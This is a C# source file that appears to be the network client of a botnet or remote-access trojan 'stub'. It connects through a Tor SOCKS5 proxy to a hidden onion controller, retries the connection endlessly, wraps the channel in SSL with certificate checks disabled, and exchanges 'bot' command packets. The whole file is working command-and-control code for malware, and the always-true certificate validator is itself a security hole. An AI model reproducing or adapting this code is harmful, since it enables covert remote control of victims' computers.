using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using Stub.Network.Gopnik;

namespace Stub.Network.Protocol
{
    class CClientSocket
    {
        public delegate void delOnClientConnected();
        public event delOnClientConnected OnClientConnected;
        public delegate void delOnClientReceiveData(BOT_PACKET Packet, Byte[] arr_bArguments);
        public event delOnClientReceiveData OnClientReceiveData;
        public delegate void delOnClientDisconnect();
        public event delOnClientDisconnect OnClientDisconnect;

        private String m_strOnionHost, m_strTorHost;
        private Int32 m_iOnionPort, m_iTorPort;

        private Boolean m_bIsRunning = false;
        private Boolean m_bIsConnected = false;

        private Socket MasterClient = null;
        private SslStream MasterStream = null;

        //Protocol
        private CProtocol m_Protocol = null;


        public CClientSocket(String OnionHost, Int32 OnionPort, String TorHost, Int32 TorPort)
        {
            if (String.IsNullOrEmpty(OnionHost) == true)
            {
                throw new ArgumentNullException("OnionHost");
            }

            if (String.IsNullOrEmpty(TorHost) == true)
            {
                throw new ArgumentNullException("TorHost");
            }

            if (OnionPort < 0 || OnionPort > 65535)
            {
                throw new ArgumentOutOfRangeException("OnionPort");
            }

            if (TorPort < 0 || TorPort > 65535)
            {
                throw new ArgumentOutOfRangeException("TorPort");
            }

            this.m_strOnionHost = OnionHost;
            this.m_iOnionPort = OnionPort;
            this.m_strTorHost = TorHost;
            this.m_iTorPort = TorPort;

            m_Protocol = new CProtocol();
            m_Protocol.OnPacketReceived += m_Protocol_OnPacketReceived;
        }

        void m_Protocol_OnPacketReceived(Byte Packet, byte[] arr_bArguments)
        {
            if (this.OnClientReceiveData != null)
                this.OnClientReceiveData.Invoke((BOT_PACKET)Packet, arr_bArguments);
        }

        public CPacket CreatePacket(Byte Packet, Byte[] arr_bArguments)
        {
            return m_Protocol.CreatePacket(Packet, arr_bArguments);
        }

        public CPacket CreatePacket(Byte Packet, String strArguments)
        {
            return m_Protocol.CreatePacket(Packet, strArguments);
        }

        public Boolean IsRunning()
        {
            return this.m_bIsRunning;
        }

        public Boolean IsConnected()
        {
            return this.m_bIsConnected;
        }

        public void Disconnect()
        {
            try
            {
                if (MasterClient != null) MasterClient.Close();
            }
            catch
            {

            }
        }
        public void Start()
        {
            if (m_bIsRunning == true) return;

            m_bIsRunning = true;

            try
            {
                Thread tConnectionThread = new Thread(new ThreadStart(this.Connection_Thread));
                tConnectionThread.Start();
            }
            catch { }
        }

        static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors Errors)
        {
            return true;
        }

        void Connection_Thread()
        {
            while (m_bIsRunning)
            {
                try
                {
#if DEBUG
                    if (m_strOnionHost == "127.0.0.1")
                    {
                        MasterClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        MasterClient.Connect((EndPoint)new IPEndPoint(IPAddress.Parse(m_strOnionHost), m_iOnionPort));
                    }
                    else
#endif
                        MasterClient = this.ConnectSocksProxy(this.m_strTorHost, (short)this.m_iTorPort, this.m_strOnionHost, (short)this.m_iOnionPort, MasterClient);
                    
                    if (MasterClient == null)
                    {
                        Thread.Sleep(10 * 1000);
                        continue;
                    }

                    this.m_bIsConnected = true;

                    MasterStream = new SslStream(new NetworkStream(MasterClient), false, new RemoteCertificateValidationCallback(ValidateServerCertificate), null);

                    MasterStream.AuthenticateAsClient("Client");

                    Byte[] arr_bBuffer = new Byte[MasterClient.ReceiveBufferSize];
                    MasterStream.BeginRead(arr_bBuffer, 0, arr_bBuffer.Length, new AsyncCallback(SSL_BeginRead_Callback), arr_bBuffer);

                    if (OnClientConnected != null) OnClientConnected.Invoke();

                    while (this.m_bIsConnected) Thread.Sleep(10 * 1000);
                }
                catch
                {

                }
            }
        }

        void SSL_BeginRead_Callback(IAsyncResult iar)
        {
            if (this.MasterClient == null || this.MasterStream == null)
            {
                this.m_bIsConnected = false;
                return;
            }

            try
            {
                Int32 iRead = MasterStream.EndRead(iar);

                if (iRead > 0)
                {
                    Byte[] arr_bBuffer = (Byte[])iar.AsyncState;

                    //Read Data into Buffer.
                    Byte[] arr_bRecvBuffer = new Byte[iRead];
                    Buffer.BlockCopy(arr_bBuffer, 0, arr_bRecvBuffer, 0, arr_bRecvBuffer.Length);

                     m_Protocol.ProcessBuffer(arr_bRecvBuffer);

                    //Receive next buffer
                    if (this.m_bIsRunning)
                    {
                        arr_bBuffer = new Byte[MasterClient.ReceiveBufferSize];
                        MasterStream.BeginRead(arr_bBuffer, 0, arr_bBuffer.Length, new AsyncCallback(SSL_BeginRead_Callback), arr_bBuffer);
                    }
                }
                else throw new Exception();
            }
            catch
            {
                if (this.OnClientDisconnect != null) this.OnClientDisconnect.Invoke();
                this.m_bIsConnected = false;
            }
        }

        public bool SendPacket(CPacket Packet)
        {
            try
            {
                //Get Header
                Byte[] arr_bHeader = Packet.PacketHeader.ToByteArray();

                //Build Buffer
                Byte[] arr_bBuffer = new Byte[1 + arr_bHeader.Length];
                arr_bBuffer[0] = (Byte)PROTOCOL_PACKET.HEADER;
                Buffer.BlockCopy(arr_bHeader, 0, arr_bBuffer, 1, arr_bHeader.Length);

                //Send Header First
                if (this.SendData(arr_bBuffer))
                {
                    foreach (CPacketBlock Block in Packet.Data_Blocks)
                    {
                        String strBlock = Packet.PacketHeader.Packet_Ident + "|" + Block.ToString();

                        Byte[] arr_bBlock = UnicodeEncoding.Unicode.GetBytes(strBlock);

                        arr_bBuffer = new Byte[1 + arr_bBlock.Length];
                        arr_bBuffer[0] = (Byte)PROTOCOL_PACKET.BLOCK;
                        Buffer.BlockCopy(arr_bBlock, 0, arr_bBuffer, 1, arr_bBlock.Length);

                        if (!this.SendData(arr_bBuffer)) return false;
                    }
                }
                return true;
            }
            catch { }
            return false;
        }

        public bool SendData(Byte[] arr_bBuffer)
        {
            if (!this.m_bIsConnected) return false;

            try
            {
                MasterStream.Write(arr_bBuffer);
                return true;
            }
            catch { }
            return false;
        }

        public void Stop()
        {
            m_bIsRunning = false;
            this.Disconnect();
        }


        Socket ConnectSocksProxy(string proxyDomain, short proxyPort, string host, short hostPort, Socket tc)
        {
            tc = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            tc.ReceiveBufferSize = 8192;
            tc.Connect(proxyDomain, proxyPort);

            byte[] HostNameBuf = new ASCIIEncoding().GetBytes(host);
            byte[] HostPortBuf = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(hostPort));

            byte[] bufout = new byte[128];
            int buflen = 0;
            tc.Send(new byte[] { 5, 1, 0 }, 0, 3, SocketFlags.None);
            buflen = tc.Receive(bufout, 0, bufout.Length, SocketFlags.None);
            if (buflen != 2 || bufout[0] != 5 || bufout[1] != 0)
                throw new Exception();

            byte[] buf = new byte[] { 5, 1, 0, 3, (byte)HostNameBuf.Length };
            MemoryStream mem = new MemoryStream();
            mem.Write(buf, 0, buf.Length);
            mem.Write(HostNameBuf, 0, HostNameBuf.Length);
            mem.Write(new byte[] { HostPortBuf[0], HostPortBuf[1] }, 0, 2);
            byte[] memarr = mem.ToArray();
            tc.Send(memarr, 0, memarr.Length, SocketFlags.None);
            buflen = tc.Receive(bufout, 0, bufout.Length, SocketFlags.None);
            if (bufout[0] != 5 || bufout[1] != 0)
                throw new Exception();

            return tc;
        }
    }
}
